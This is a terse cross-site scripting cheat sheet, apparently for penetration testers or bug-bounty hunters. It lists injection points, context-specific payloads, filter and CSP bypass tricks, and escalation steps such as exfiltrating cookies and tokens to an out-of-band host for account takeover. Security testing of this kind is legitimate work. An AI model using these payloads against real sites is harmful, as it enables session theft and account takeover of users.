## Cross-Site Scripting (XSS)
Where: reflected (search/error/redirect/UTM params), stored (comments/profile/filename/markdown/SVG/rich-text), DOM (`location.hash`/`postMessage` -> `innerHTML`/`document.write`/`eval`).
Probe: unique marker `xss7317` first — see where it lands and in what context (HTML body, attribute, JS string, URL, CSS). Then break out of THAT context.
Contexts: HTML `<script>alert(1)</script>` / `<img src=x onerror=alert(1)>`; attribute `"><svg onload=alert(1)>` or `" autofocus onfocus=alert(1) x="`; JS string `';alert(1);//` or `</script><script>alert(1)</script>`; URL `javascript:alert(1)`.
Filter bypass: case `<ScRiPt>`, no-parens `onerror=alert\`1\``, no-`alert` `(alert)(1)`/`top[/al/.source+/ert/.source]`, HTML-entity/unicode escapes, `<svg><animate onbegin=alert(1)>`, mutation XSS via innerHTML normalization.
CSP bypass: JSONP endpoints on allowed origins, `base-uri` missing, dangling `nonce` reuse, `unsafe-eval` gadgets (Angular/Vue template injection `{{constructor.constructor('alert(1)')()}}`).
SVG/markdown/stored: upload `<svg onload=...>`, markdown `[a](javascript:alert1)`, filename `"><img...>`.
Escalate (this is the impact, report it): steal `document.cookie` / localStorage tokens to OOB, CSRF-token exfil, keylog, or force state-changing requests as the victim -> account takeover. DOM-XSS via postMessage without origin check.
